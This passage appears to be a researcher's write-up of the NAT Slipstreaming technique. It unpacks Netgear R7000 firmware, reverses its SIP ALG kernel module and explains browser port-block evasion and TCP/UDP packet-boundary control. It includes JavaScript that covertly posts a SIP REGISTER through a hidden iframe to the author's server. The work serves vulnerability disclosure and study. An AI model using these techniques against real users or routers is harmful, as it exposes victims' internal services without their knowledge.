&lt;p&gt;We'll start with a common router, the Netgear Nighthawk R7000. A &lt;a target=&quot;_blank&quot; href=&quot;http://bfy.tw/NjZh&quot;&gt;quick search&lt;/a&gt; helps us find a &lt;a target=&quot;_blank&quot; href=&quot;https://kb.netgear.com/000060566/R7000-Firmware-Version-1-0-9-64&quot;&gt;Netgear article&lt;/a&gt; with &lt;a target=&quot;_blank&quot; href=&quot;http://www.downloads.netgear.com/files/GDC/R7000/R7000-V1.0.9.64_10.2.64.zip&quot;&gt;recent firmware&lt;/a&gt;. Once we download the firmware and unzip, we find a 30MB file called R7000-V1.0.9.64_10.2.64.chk.&lt;/p&gt;
&lt;div readability=&quot;11&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;tigerblood:~c/ng$ wget http://www.downloads.netgear.com/files/GDC/R7000/R7000-V1.0.9.64_10.2.64.zip
--2019-05-19 19:21:13--  http://www.downloads.netgear.com/files/GDC/R7000/R7000-V1.0.9.64_10.2.64.zip
Resolving www.downloads.netgear.com (www.downloads.netgear.com)... 104.69.65.243
Connecting to www.downloads.netgear.com (www.downloads.netgear.com)|104.69.65.243|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 31705064 (30M) [application/zip]
Saving to: ‘R7000-V1.0.9.64_10.2.64.zip’

R7000-V1.0.9.64_10.2.64.zip  100%[=============================================&amp;gt;]  30.24M  6.25MB/s    in 11s

2019-05-19 19:21:24 (2.83 MB/s) - ‘R7000-V1.0.9.64_10.2.64.zip’ saved [31705064/31705064]

tigerblood:~c/ng$ unzip R7000-V1.0.9.64_10.2.64.zip
Archive:  R7000-V1.0.9.64_10.2.64.zip
 extracting: R7000-V1.0.9.64_10.2.64.chk
  inflating: R7000-V1.0.9.64_10.2.64_Release_Notes.html
tigerblood:~c/ng$ file R7000-V1.0.9.64_10.2.64.chk
R7000-V1.0.9.64_10.2.64.chk: data
tigerblood:~c/ng$ ls -lh R7000-V1.0.9.64_10.2.64.chk
-rw-r--r--  1 samy  staff    30M Mar 26 11:46 R7000-V1.0.9.64_10.2.64.chk&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/samyk/slipstream/main/img/ngchk.png&quot; alt=&quot;R7000-V1.0.9.64_10.2.64.chk&quot;/&gt;&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;file&lt;/code&gt; command doesn't detect any &lt;a target=&quot;_blank&quot; href=&quot;https://www.wikiwand.com/en/Magic_number_(programming)&quot;&gt;magic info&lt;/a&gt;, so we can use &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/ReFirmLabs/binwalk&quot;&gt;&lt;code&gt;binwalk&lt;/code&gt;&lt;/a&gt; to scan the file for nested data.&lt;/p&gt;
&lt;div readability=&quot;29&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;tigerblood:~c/ng$ binwalk R7000-V1.0.9.64_10.2.64.chk

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
58            0x3A            TRX firmware header, little endian, image size: 31703040 bytes, CRC32: 0xBEF1BB2F, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x21E3F0, rootfs offset: 0x0
86            0x56            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5436416 bytes
2221098       0x21E42A        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 29475437 bytes, 1988 inodes, blocksize: 131072 bytes, created: 2018-12-26 04:15:38&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/samyk/slipstream/main/img/ngbinwalk.png&quot; alt=&quot;binwalk R7000-V1.0.9.64_10.2.64.chk&quot;/&gt;&lt;/p&gt;
&lt;p&gt;I use macOS and binwalk depends on some Linux apps out of the box which would cause &lt;code&gt;binwalk -e&lt;/code&gt; (which extracts files) to fail so I extract manually (and I &amp;lt;3 perl golf).&lt;/p&gt;
&lt;div readability=&quot;8&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;tigerblood:~c/ng$ perl -ne'$@.=$_}{print+substr$@,2221098' R7000-V1.0.9.64_10.2.64.chk &amp;gt; squash.fs&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Or use &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/samyk/samytools/blob/master/inout&quot;&gt;&lt;code&gt;inout&lt;/code&gt;&lt;/a&gt;, eg &lt;code&gt;inout R7000-V1.0.9.64_10.2.64.chk 2221098&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;You could use &lt;code&gt;dd&lt;/code&gt;, however you'd want a large &lt;code&gt;bs&lt;/code&gt; (block size) so that it would output quickly, eg 1024, however the &lt;code&gt;skip&lt;/code&gt; attribute (to tell it to start at the location of the squashfs blob) would respect the block size and 2221098 isn’t obviously divisible in anything quickly in my head other than 2…now I’m curious.&lt;/p&gt;
&lt;div readability=&quot;9&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;tigerblood:~c/ng$ time dd if=R7000-V1.0.9.64_10.2.64.chk skip=$((2221098/2)) bs=2 of=squash.fs2
14741000+0 records in
14741000+0 records out
29482000 bytes transferred in 78.363403 secs (376222 bytes/sec)

real    1m18.385s
user    0m12.553s
sys     1m4.451s&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now let's unpack the squash filesystem. I’ve created a &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/samyk/squashfs-tools&quot;&gt;fork of a fork of squashfs-tools&lt;/a&gt; that runs on macOS and has &lt;code&gt;lzo&lt;/code&gt; support. You may need to install &lt;code&gt;xz&lt;/code&gt; and &lt;code&gt;lzo&lt;/code&gt; as well. Alternatively, you could use &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/devttys0/sasquatch&quot;&gt;&lt;code&gt;sasquatch&lt;/code&gt;&lt;/a&gt; on Linux.&lt;/p&gt;
&lt;div readability=&quot;8&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;tigerblood:~c/ng$ sudo port install xz lzo
...
tigerblood:~c/ng$ git clone https://github.com/samyk/squashfs-tools &amp;amp;&amp;amp; cd squashfs-tools/squashfs-tools &amp;amp;&amp;amp; make &amp;amp;&amp;amp; sudo make install &amp;amp;&amp;amp; cd ../..&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And finally we can unpack the squash fs.&lt;/p&gt;
&lt;div readability=&quot;10&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;tigerblood:~c/ng$ unsquashfs -l -no squash.fs
Parallel unsquashfs: Using 8 processors
1881 inodes (2535 blocks) to write

squashfs-root
squashfs-root/bin
squashfs-root/bin/addgroup
... (many more files) ...

tigerblood:~c/ng$ cd squashfs-root &amp;amp;&amp;amp; ls
bin   data  dev   etc   lib   media mnt   opt   proc  sbin  share sys   tmp   usr   var   www&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We now have the raw OS to explore!&lt;/p&gt;
&lt;h2 id=&quot;reverse-engineering-firmware&quot;&gt;Reverse Engineering Firmware&lt;/h2&gt;
&lt;h3 id=&quot;finding-interesting-files&quot;&gt;Finding Interesting Files&lt;/h3&gt;
&lt;p&gt;Now let's see if we can find any files relevant to FTP as it was a heavily used protocol so ALG support will be rampant across routers. I use my &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/samyk/samytools/blob/master/g&quot;&gt;&lt;code&gt;g tool&lt;/code&gt;&lt;/a&gt; which is just a convenient wrapper around &lt;code&gt;egrep&lt;/code&gt;.&lt;/p&gt;
&lt;div readability=&quot;8&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;tigerblood:~c/ng/squashfs-root$ find . | g ftp
./usr/bin/tftp
./usr/sbin/bftpd
./usr/sbin/ftp
./usr/sbin/ftpc
./usr/etc/sftp-ssh.service&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nothing interesting, so let's &lt;code&gt;g&lt;/code&gt; for binary files whose content matches /ftp/, ignoring some files we don’t care about.&lt;/p&gt;
&lt;div readability=&quot;10&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;tigerblood:~c/ng/squashfs-root$ g -la ftp -v '\.(html?|js|gif)$|www/|bin/'
lib/libsmbd-base-samba4.so
lib/libavformat.so.55
lib/libavutil.so.52
lib/libavcodec.so.55
lib/modules/tdts.ko
lib/modules/2.6.36.4brcmarm+/kernel/lib/br_dns_hijack.ko
lib/libcrypto.so.1.0.0
opt/xagent/certs/ca-bundle-mega.crt
usr/etc/sftp-ssh.service
usr/lib/libnvram.so
usr/lib/libcurl.a
usr/lib/libcurl.so.4.3.0
usr/lib/libcurl.so
usr/share/avahi/service-types
usr/share/libcrypto.so.1.0.0&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/samyk/samytools/blob/master/g&quot;&gt;&lt;code&gt;g&lt;/code&gt;&lt;/a&gt; recursively scans the current working directory by default. &lt;code&gt;-l&lt;/code&gt; is to only print file names (as these will be mostly binary), &lt;code&gt;-a&lt;/code&gt; to scan binary files, &lt;code&gt;ftp&lt;/code&gt; for text to match, and &lt;code&gt;-v '\.(html?|js|gif)$|www/|bin/'&lt;/code&gt; to ignore web files and executables (sitting in (s)bin/).&lt;/p&gt;
&lt;p&gt;Any &lt;code&gt;lib/lib*.{a,so}{.*,}&lt;/code&gt; (bash format) files are uninteresting, so let's scan again with less:&lt;/p&gt;
&lt;div readability=&quot;9&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;tigerblood:~c/ng/squashfs-root$ g -la ftp -v '\.(html?|js|gif)$|www/|bin/|lib.*\.(so|a)(\.|$)'
lib/modules/tdts.ko
lib/modules/2.6.36.4brcmarm+/kernel/lib/br_dns_hijack.ko
opt/xagent/certs/ca-bundle-mega.crt
usr/etc/sftp-ssh.service
usr/share/avahi/service-types&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;exploring-interesting-functions&quot;&gt;Exploring Potentially Useful Functions&lt;/h3&gt;
&lt;p&gt;Okay, two files of interest – &lt;code&gt;lib/modules/tdts.ko&lt;/code&gt; could be related, and &lt;code&gt;lib/modules/2.6.36.4brcmarm+/kernel/lib/br_dns_hijack.ko&lt;/code&gt; is probably not related but sounds interesting! May investigate that later.&lt;/p&gt;
&lt;div readability=&quot;14&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;tigerblood:~c/ng/squashfs-root$ file lib/modules/tdts.ko
lib/modules/tdts.ko: ELF 32-bit LSB relocatable, ARM, EABI5 version 1 (SYSV), BuildID[sha1]=0aa35748e245e60273ceb5a48641e424d069235b, not stripped
tigerblood:~c/ng/squashfs-root$ strings lib/modules/tdts.ko | g ftp
ftp_decoder_open
ftp_decoder_close
ftp_decode_epsv_resp
ftp_decode_eprt_cmd
ftp_decode_pasv_resp
ftp_decode
ftp_decode_port_cmd
ftp_decoder
check_ftp_ft_rule&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nice! A kernel object (.ko) with ftp functions, and with words like &quot;port&quot;, it's likely related to an FTP ALG. The &lt;a target=&quot;_blank&quot; href=&quot;https://tools.ietf.org/html/rfc959&quot;&gt;FTP RFC 959&lt;/a&gt; explains the meaning of the &lt;code&gt;PORT&lt;/code&gt; command:&lt;/p&gt;
&lt;div readability=&quot;17&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-none&quot;&gt;DATA PORT (PORT)

The argument is a HOST-PORT specification for the data port
to be used in data connection.  There are defaults for both
the user and server data ports, and under normal
circumstances this command and its reply are not needed.  If
this command is used, the argument is the concatenation of a
32-bit internet host address and a 16-bit TCP port address.
This address information is broken into 8-bit fields and the
value of each field is transmitted as a decimal number (in
character string representation).  The fields are separated
by commas.  A port command would be:
    PORT h1,h2,h3,h4,p1,p2
where h1 is the high order 8 bits of the internet host
address.&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;ports--services-to-investigate&quot;&gt;Ports / Services to Investigate&lt;/h3&gt;
&lt;p&gt;While we've found some FTP functions, we’re more interested in ports that we can use. Modern browsers prevent outbound HTTP(S) connections to a number of &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/samyk/chromium/blob/2d57e5b8afc6d01b344a8d95d3470d46b35845c5/net/base/port_util.cc#L20-L90&quot;&gt;restricted ports&lt;/a&gt;, including FTP, so abusing the FTP ALG is likely a no-go.&lt;/p&gt;
&lt;p&gt;In 2010, when I &lt;a target=&quot;_blank&quot; href=&quot;https://samy.pl/natpin/&quot;&gt;first demonstrated NAT Pinning&lt;/a&gt;, I used port 6667 (IRC) via the DCC CHAT/FILE messages. Quickly, browser vendors blocked port 6667…though some used a uint32 (32 bit unsigned integer) to store the port, check if the port was blocked, and if not, connect. To evade this, it's important to note TCP ports are 16 bits long, so if you add 2**16 (65536) to the &quot;restricted&quot; port of choice, in this case 65536+6667=72203, the browser would store 72203, it would pass the port restriction (72203 != 6667), then would get sent off to the TCP stack where it gets truncated to 16 bits which is the restricted port we wanted!&lt;/p&gt;
&lt;p&gt;My simple &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/samyk/samytools/blob/master/3&quot;&gt;&lt;code&gt;base calculator, 3&lt;/code&gt;&lt;/a&gt; shows this (db = dec -&amp;gt; bin):&lt;/p&gt;
&lt;div readability=&quot;8&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;tigerblood:/Users/samy/d$ 3 db 65536 6667 65536+6667
000000010000000000000000
000000000001101000001011
000000010001101000001011&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see it better using my &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/samyk/samytools/blob/master/diffbits&quot;&gt;&lt;code&gt;diffbits&lt;/code&gt;&lt;/a&gt; tool, a simple tool for viewing similarities and differences between bit strings, as well as between multiple groups of bit strings, useful for reversing proprietary, binary protocols.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/samyk/slipstream/main/img/diffbits.png&quot; alt=&quot;diffbits&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;reversing-the-kernel-object&quot;&gt;Reversing the Kernel Object&lt;/h3&gt;
&lt;p&gt;Go ahead and open your disassembler of choice. I've used &lt;a target=&quot;_blank&quot; href=&quot;https://ghidra-sre.org&quot;&gt;Ghidra&lt;/a&gt; from our friends at the &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/NationalSecurityAgency/&quot;&gt;NSA&lt;/a&gt; as it’s free and open source.&lt;/p&gt;
&lt;p&gt;Some of the functions we saw in &lt;code&gt;tdts.ko&lt;/code&gt; via &lt;code&gt;strings&lt;/code&gt; was &lt;code&gt;ftp_decode&lt;/code&gt; and &lt;code&gt;ftp_decoder&lt;/code&gt;, so it's possible other ALGs will have a &lt;code&gt;_decode&lt;/code&gt; function. Let’s look…&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/samyk/slipstream/main/img/ghidraftp.png&quot; alt=&quot;Ghidra _decode&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Alright, a bunch of _decode functions…scrolling down, an interesting one is &lt;code&gt;sip_decode&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/samyk/slipstream/main/img/ghidra-sip.png&quot; alt=&quot;Ghidra tdts.ko&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Checking our &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/samyk/chromium/blob/2d57e5b8afc6d01b344a8d95d3470d46b35845c5/net/base/port_util.cc#L20-L90&quot;&gt;restricted browser ports&lt;/a&gt;, we see 5060, the default SIP port, is not restricted in Chrome :)&lt;/p&gt;
&lt;h3 id=&quot;attempting-sip-packet-in-http-post&quot;&gt;Attempting SIP Packet in HTTP POST&lt;/h3&gt;
&lt;p&gt;SIP lives on TCP/UDP 5060, but media like RTP (audio) is sent on alternate ports that are generated on the fly. When sending a request for a SIP call, your SIP client chooses a random port, opens it, and includes it in the SIP header. Your NAT should also see it and open it up, assuming the SIP ALG is enabled (and is on most routers by default).&lt;/p&gt;
&lt;p&gt;Assuming NATs reader SIP packets line by line (SIP is newline-based like HTTP and is not a binary protocol), perhaps it will ignore the HTTP header and once it gets to the POST data, read the REGISTER and believe it's a SIP packet. This worked in our 2010 version for the IRC DCC. The NAT ignored the HTTP header and just parsed the IRC DCC command.&lt;/p&gt;
&lt;p&gt;Funny thing, this also allowed us to actually make users who visit our site connect to a &lt;em&gt;legitimate&lt;/em&gt; IRC server, join a channel, and send a message from their IP without them knowing! :P I demo'd this technique for sending email to mail servers with client IP addresses before port 25 was blocked by browsers and before SPF records were common…craziness.&lt;/p&gt;
&lt;p&gt;Now, in a quick test, sending a SIP REGISTER packet over port 5060 through an HTTP POST doesn't seem to work…perhaps we’re missing something from the packet.&lt;/p&gt;
&lt;div readability=&quot;15&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-javascript&quot;&gt;// our sip message
var sipmsg = 'REGISTER sip:samy.pl;transport=TCP SIP/2.0\r\n' +
             'Contact: &amp;lt;sip:samy@192.168.0.109:1234;transport=TCP&amp;gt;\r\n\r\n'

// load form in an iframe so user doesn't se it
var iframe = document.createElement('iframe')
iframe.name = 'iframe'
iframe.style.display = 'none' // hide the iframe

// create form
var form = document.createElement('form')
form.setAttribute('target', 'iframe') // load into iframe
form.setAttribute('method', 'POST') // need the POST area where we can add CRLFs
form.setAttribute('action', 'http://samy.pl:5060') // &quot;http&quot; server on SIP port 5060
form.setAttribute('enctype', 'multipart/form-data') // ensure our data doesn't get encoded

var textarea = document.createElement('textarea')
textarea.setAttribute('name', 'textname') // required
textarea.innerHTML = sipmsg
form.appendChild(textarea)
document.body.appendChild(iframe)
document.body.appendChild(form)
form.submit()&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If we sniff, we see (parsed via &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/samyk/samytools/blob/master/h2b&quot;&gt;&lt;code&gt;h2b&lt;/code&gt;&lt;/a&gt;):&lt;/p&gt;
&lt;div readability=&quot;19&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;$ unbuffer tcpdump -X port 5060 | h2b
POST / HTTP/1.1
Host: samy.pl:5060
Connection: keep-alive
Content-Length: 191
Cache-Control: max-age=0
Origin: http://samy.pl
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhcoAd2iSAx3TJA7A
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.66 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://samy.pl/o/sp.html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

------WebKitFormBoundaryhcoAd2iSAx3TJA7A
Content-Disposition: form-data; name=&quot;textname&quot;

REGISTER sip:samy.pl;transport=TCP SIP/2.0
Contact: &amp;lt;sip:samy@192.168.0.109:1234;transport=TCP&amp;gt;


------WebKitFormBoundaryhcoAd2iSAx3TJA7A--&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;However, this doesn't open the port, nor is the IP rewritten which we’d expect (more on this later), so we must be missing something.&lt;/p&gt;
&lt;h3 id=&quot;continue-reversing-kernel-object-further&quot;&gt;Continue Reversing Kernel Object Further&lt;/h3&gt;
&lt;p&gt;Let's keep digging in the kernel object. In the diassembly, we see the &quot;SIP/2.0&quot; tag from a SIP packet, so it’s likely parsing here (which “decode” sounds like).&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/samyk/slipstream/main/img/ghidrabne2.png&quot; alt=&quot;Ghidra sip_decode&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Ah, this is why we fail. Looks like it's running strncasecmp on &lt;a target=&quot;_blank&quot; href=&quot;https://tools.ietf.org/html/rfc2543#section-4.2.1&quot;&gt;INVITE&lt;/a&gt; (similar parsing on REGISTER) – matching (case-insensitive, which is interesting as SIP INVITEs are upper case) the word &quot;INVITE&quot; at the beginning of the packet and &lt;strong&gt;b&lt;/strong&gt;ranches if &lt;strong&gt;n&lt;/strong&gt;ot &lt;strong&gt;e&lt;/strong&gt;qual (ARM assembly &lt;code&gt;bne&lt;/code&gt;) to 0, so if the words do match, the lexicographical order will be 0 and we’ll continue to &lt;code&gt;ct_sip_get_header&lt;/code&gt; which sounds fun, and seems to bail otherwise.&lt;/p&gt;
&lt;p&gt;This is the problem…while we can use a web browser to produce outbound sockets (TCP via HTTP(S), UDP via TURN w/WebRTC), we don't have enough control over the browser to start the TCP data portion with the word &quot;INVITE&quot;, which this module expects. In the &lt;a target=&quot;_blank&quot; href=&quot;https://samy.pl/natpin/&quot;&gt;2010 IRC version&lt;/a&gt;, the IRC ALG only looked line by line, ignoring all the HTTP header data, then using newlines in the POST data to send a valid “IRC DCC”. However, this SIP ALG is much more strict and controlling the beginning of the request is not possible. If using TLS, encrypted header will start the packet. If using HTTP, the HTTP method will begin the packet (GET, POST, etc). Can we exploit this some other way?&lt;/p&gt;
&lt;h2 id=&quot;connection-tracking--application-level-gateway-investigation&quot;&gt;Connection Tracking / Application Level Gateway Investigation&lt;/h2&gt;
&lt;h3 id=&quot;linux-netfilter&quot;&gt;Linux Netfilter&lt;/h3&gt;
&lt;p&gt;To better understand connection tracking and Application Level Gateways, we can look to see how they behave in &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/samyk/linux/tree/master/net/netfilter&quot;&gt;netfilter, Linux's network stack&lt;/a&gt;. I’ve created a chart of the most common ALGs and how they behave based off of parsing the Linux source.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/samyk/slipstream/main/img/alg.png&quot; alt=&quot;Linux ALG&quot;/&gt;&lt;/p&gt;
&lt;p&gt;From this chart, the most interesting ones (that Chrome does not block) are sane (backup), sip (voip), pptp (vpn), and h323 (voip). We'll choose SIP as it’s one of the more ubiquitous of these protocols, and we already see it in some routers' firmware.&lt;/p&gt;
&lt;p&gt;Linux specifically has &lt;code&gt;nf_conntrack_*.c&lt;/code&gt; files for handling connection tracking on a per protocol basis, and &lt;code&gt;nf_nat_*.c&lt;/code&gt; for packet mangling (modification).&lt;/p&gt;
&lt;p&gt;We'll take a quick look at the &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/samyk/linux/blob/29b0b5d56589d66bd5793f1e09211ce7d7d3cd36/net/netfilter/nf_conntrack_sip.c&quot;&gt;SIP connection tracking module&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;packet-boundary--fragmentation-control&quot;&gt;Packet Boundary Control&lt;/h2&gt;
&lt;p&gt;As far as we know, we can't make the browser force an outbound TCP connection with whatever traffic we want, and it’s necessary for us to create a TCP/UDP packet starting with a SIP method such as REGISTER or INVITE.&lt;/p&gt;
&lt;p&gt;Flash used to allow outbound sockets, but was in a format that we didn't have full control of. Java requires permission. WebSockets are still HTTP. TLS is encrypted. &lt;a target=&quot;_blank&quot; href=&quot;https://tools.ietf.org/html/rfc7742&quot;&gt;WebRTC (RFC 7742)&lt;/a&gt; is encrypted. &lt;a target=&quot;_blank&quot; href=&quot;https://tools.ietf.org/html/rfc3489&quot;&gt;STUN (RFC 3489)&lt;/a&gt; and &lt;a target=&quot;_blank&quot; href=&quot;https://tools.ietf.org/html/rfc5766&quot;&gt;TURN (RFC 5766)&lt;/a&gt; are in fixed formats, and &lt;a target=&quot;_blank&quot; href=&quot;https://tools.ietf.org/html/rfc7065&quot;&gt;TURNS (RFC 7065)&lt;/a&gt; is encrypted.&lt;/p&gt;
&lt;h2 id=&quot;&quot;&gt;TCP Segmentation&lt;/h2&gt;
&lt;p&gt;At a high level, we can't control the start of the TCP packet, but what if we send too large of a packet? There must be a maximum packet size…at which point, a packet must be fragmented into multiple packets. &lt;strong&gt;If we can overflow the TCP packet size and precisely control part of the data, could we cause packet segmentation and have our data be at the very beginning of our next, overflowed packet?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Well, we would need to know how much data the browser will send, which will be different per browser, and even by user as they may send different HTTP headers. HTTPS won't work as most of the content is encrypted, where an HTTP POST allows us to control a large portion of the header.&lt;/p&gt;
&lt;p&gt;To get the general size of the packet, we send a &lt;strong&gt;large&lt;/strong&gt; (6000 byte) HTTP POST with an ID and padding data with a hidden web form to our http://our.attack.server:5060/pktsize. On the attack server, we run a &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/samyk/slipstream/blob/main/max_pkt_size.pl&quot;&gt;packet sniffer&lt;/a&gt; which looks for the boundaries of our packet to determine MTU (Maximum Transmission Unit) size, IP header size, potential IP options, TCP header size, potential TCP options, data packet size, and what portion of the packet we control.&lt;/p&gt;
&lt;p&gt;We also run a &lt;a href=&quot;https://github.com/samyk/slipstream/blob/main/serv-sip.pl&quot;&gt;custom server&lt;/a&gt; that listens on TCP port 5060, and responds with HTTP traffic to appease the browser so nothing looks fishy on the client side (a server with a malformed response would cause errors in the console, or an incorrectly responding server would keep the status spinner going).&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/samyk/slipstream/main/img/sniff2.png&quot; alt=&quot;POST large form to measure MTU and TCP data size&quot;/&gt;&lt;/p&gt;
&lt;p&gt;We further attempt to control the TCP packet data size by sending a Maximum Segment Size (mss) TCP Option during the initial SYN response to manipulate the victim's outbound packet sizes (&lt;a target=&quot;_blank&quot; href=&quot;https://tools.ietf.org/html/rfc793#section-3.1&quot;&gt;RFC 793 x3.1&lt;/a&gt;). This tells the victim machine to keep TCP packets to a certain size.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/samyk/slipstream/main/img/sniff1.png&quot; alt=&quot;Custom Maximum Segment Size (mss)&quot;/&gt;&lt;/p&gt;
&lt;p&gt;You can do this on Linux by appending &lt;code&gt;advmss &amp;lt;size&amp;gt;&lt;/code&gt; to &lt;code&gt;ip route&lt;/code&gt;. We'll use 1500.&lt;/p&gt;
&lt;div readability=&quot;7&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;ip route replace default via [gateway] dev eth0 advmss 1500&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Once we get the packets, we send the size data back to the victim client over a separate POST, which sent the victim's ID so we can correlate it with the original request from the victim. At this point, the client has a good idea of how to pad packets to cause arbitrary data to land at any specific location in a TCP packet.&lt;/p&gt;
&lt;h3 id=&quot;toc_19&quot;&gt;IP Fragmentation with UDP and TURN&lt;/h3&gt;
&lt;p&gt;Some NATs only allow UDP ports to be accessed if the SIP connection was originally UDP, so we use TURN in this case. TURN is a protocol supporting relaying for peer-to-peer communication like SIP and WebRTC. TURN is UDP while TURNS (TURN+TLS) is TCP. Modern browsers support TURN for WebRTC in case they can't make a direct peer-to-peer connection with each other for media sharing.&lt;/p&gt;
&lt;p&gt;TURN allows authentication via username and password, the username is sent in cleartext. Interestingly, the username is not limited by any size or characters, so we can use this to perform the same type of packet overflow.&lt;/p&gt;
&lt;p&gt;Since TURN is over UDP, the IP packet itself will get fragmented if overflowing over the MTU size (UDP doens't support segmentation). The 2nd packet will have not only the data portion under our control, but the UDP header as well! This is not important for our attack, but is interesting and can definitely produce alternate attacks. Ultimately we can perform the same attack through UDP by aligning our packet boundary based off of calculated MTU size rather than MSS size, making our SIP UDP packet live on the 2nd packet boundary (with a fake UDP header prepended) allowing us to forward UDP ports back to our vitim.&lt;/p&gt;
&lt;h2 id=&quot;tcp-timing-attack--internal-subnet--ip-discovery&quot;&gt;TCP Timing Attack / Internal Subnet &amp;amp; IP Discovery&lt;/h2&gt;
&lt;p&gt;Oh, this still won't work! In order for the ALG to treat it as a legitimate SIP packet, the IP address you’re requesting data to come back on (in the &lt;a target=&quot;_blank&quot; href=&quot;https://tools.ietf.org/html/rfc2543#section-6.13&quot;&gt;&lt;code&gt;Contact&lt;/code&gt;&lt;/a&gt; SIP line) must be the internal IP (victim) the SIP packet came from, which we don’t know. Only the router’s public IP address is transmitted to our server (as the NAT rewrites the source IP when it exits the public side).&lt;/p&gt;
&lt;p&gt;We see this check in Linux's &lt;code&gt;nf_conntrack_sip.c&lt;/code&gt;’s &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/samyk/linux/blob/ea2cec24c8d429ee6f99040e4eb6c7ad627fe777/net/netfilter/nf_conntrack_sip.c#L1260&quot;&gt;process_sip_request&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/samyk/slipstream/main/img/nfsipreqcon.png&quot; alt=&quot;SIP REGISTER Via IP validation&quot;/&gt;&lt;/p&gt;
&lt;p&gt;In &lt;a target=&quot;_blank&quot; href=&quot;https://samy.pl/natpin/&quot;&gt;2010&lt;/a&gt;, we used &lt;a target=&quot;_blank&quot; href=&quot;https://developer.mozilla.org/en-US/docs/Archive/Web/LiveConnect&quot;&gt;LiveConnect&lt;/a&gt; which allowed executing Java code under some conditions from Javascript, extracting the user's local IP. That became obsolete pretty quickly.&lt;/p&gt;
